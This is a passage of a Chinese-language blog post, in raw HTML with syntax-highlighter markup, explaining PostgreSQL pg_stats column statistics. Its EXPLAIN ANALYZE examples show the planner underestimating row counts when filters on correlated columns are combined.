class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-13\"><span class=\"crayon-i\">schemaname</span>             <span class=\"crayon-o\">|</span> <span class=\"crayon-m\">public</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-14\"><span class=\"crayon-i\">tablename</span>              <span class=\"crayon-o\">|</span> <span class=\"crayon-e\">tbl</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-15\"><span class=\"crayon-i\">attname</span>                <span class=\"crayon-o\">|</span> <span class=\"crayon-e\">col1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-16\"><span class=\"crayon-i\">inherited</span>              <span class=\"crayon-o\">|</span> <span class=\"crayon-i\">f</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-17\"><span class=\"crayon-v\">null</span><span class=\"crayon-sy\">_</span>frac              <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-18\"><span class=\"crayon-v\">avg</span><span class=\"crayon-sy\">_</span>width              <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">4</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-19\"><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">_</span>distinct             <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">1000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-20\"><span class=\"crayon-v\">most_common</span><span class=\"crayon-sy\">_</span>vals       <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">318</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">564</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">596</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-21\"><span class=\"crayon-v\">most_common</span><span class=\"crayon-sy\">_</span>freqs      <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">0.00173333</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0.0017</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0.00166667</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0.00156667</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-22\"><span class=\"crayon-v\">histogram</span><span class=\"crayon-sy\">_</span>bounds       <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">39</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-23\"><span class=\"crayon-i\">correlation</span>            <span class=\"crayon-o\">|</span> <span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-24\"><span class=\"crayon-v\">most_common</span><span class=\"crayon-sy\">_</span>elems      <span class=\"crayon-o\">|</span> </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-25\"><span class=\"crayon-v\">most_common_elem</span><span class=\"crayon-sy\">_</span>freqs <span class=\"crayon-o\">|</span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-26\"><span class=\"crayon-v\">elem_count</span><span class=\"crayon-sy\">_</span>histogram   <span class=\"crayon-o\">|</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0592 seconds] -->\r\n<p><strong>单列统计数据不足时</strong></p>\n<p>这些单列统计信息可帮助 planner 估算你的条件选择性（这是 planner 用来估算<a href=\"https://www.postgresql.org/docs/10/static/row-estimation-examples.html\" rel=\"nofollow\">索引扫描</a>将选择多少行的内容）。 当查询中存在多个条件时，planner 假定列（或 where 子句条件）彼此独立。 当列相互关联或相互依赖并导致 planner 低估或高估这些条件将返回的行数时，就不适用。</p>\n<p>我们来看下面的几个例子。 为了使查询计划易于阅读，我们通过设置 max_parallel_workers_per_gather  为 0 来关闭每个查询的并行性：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e28050019107\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1;                            \r\n                                                QUERY PLAN                                                 \r\n-----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..169247.80 rows=9584 width=8) (actual time=0.641..622.851 rows=10000 loops=1)\r\n   Filter: (col1 = 1)\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.051 ms\r\n Execution time: 623.185 ms\r\n(5 rows)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e28050019107-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e28050019107-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e28050019107-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e28050019107-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e28050019107-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e28050019107-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e28050019107-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e28050019107-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e28050019107-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e28050019107-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-i\">FROM</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">where</span> <span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span>                            </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e28050019107-2\">                                                <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                 </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e28050019107-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e28050019107-4\"> <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..169247.80</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9584</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.641..622.851</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e28050019107-5\">   <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e28050019107-6\">   <span class=\"crayon-i\">Rows</span> <span class=\"crayon-i\">Removed</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">9990000</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e28050019107-7\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.051</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e28050019107-8\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">623.185</span> <span class=\"crayon-e\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e28050019107-9\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0144 seconds] -->\r\n<p>正如你看到的那样，planner 估计 col1 的值为 1 的行数是 9584 ，而查询返回的实际行数是 10000 ，所以相当准确。</p>\n<p>当你在 column 1 和 column 2 都包含过滤器时会发生什么情况。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e2d511857099\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nEXPLAIN ANALYZE SELECT * FROM tbl where col1 = 1 and col2 = 0;                            \r\n                                                QUERY PLAN                                                \r\n----------------------------------------------------------------------------------------------------------\r\n Seq Scan on tbl  (cost=0.00..194248.69 rows=100 width=8) (actual time=0.640..630.130 rows=10000 loops=1)\r\n   Filter: ((col1 = 1) AND (col2 = 0))\r\n   Rows Removed by Filter: 9990000\r\n Planning time: 0.072 ms\r\n Execution time: 630.467 ms\r\n(5 rows)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e2d511857099-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e2d511857099-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e2d511857099-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e2d511857099-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e2d511857099-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e2d511857099-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e2d511857099-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e2d511857099-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e2d511857099-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e2d511857099-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-i\">FROM</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">where</span> <span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-st\">and</span> <span class=\"crayon-i\">col2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span>                            </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e2d511857099-2\">                                                <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e2d511857099-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e2d511857099-4\"> <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..194248.69</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">100</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.640..630.130</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e2d511857099-5\">   <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col1</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-st\">AND</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">col2</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e2d511857099-6\">   <span class=\"crayon-i\">Rows</span> <span class=\"crayon-i\">Removed</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">9990000</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e2d511857099-7\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.072</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e2d511857099-8\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">630.467</span> <span class=\"crayon-e\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e2d511857099-9\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0036 seconds] -->\r\n<p>planner 